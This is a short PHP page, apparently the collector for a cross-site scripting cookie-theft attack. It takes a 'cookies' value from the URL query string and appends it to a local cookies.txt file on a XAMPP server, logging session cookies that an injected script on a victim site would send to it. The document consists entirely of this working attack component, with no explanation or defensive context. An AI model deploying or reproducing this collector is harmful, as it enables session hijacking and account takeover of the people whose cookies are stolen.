<!DOCTYPE html>
<html>
	<body>
	<?php
		$cookie = $_GET["cookies"];
		$file = fopen("C:/xampp/htdocs/Taha/cookies.txt", "a");
		fwrite($file, $cookie);
		fwrite($file, "\r\n");
		fclose($file);
	?>
	</body>
</html>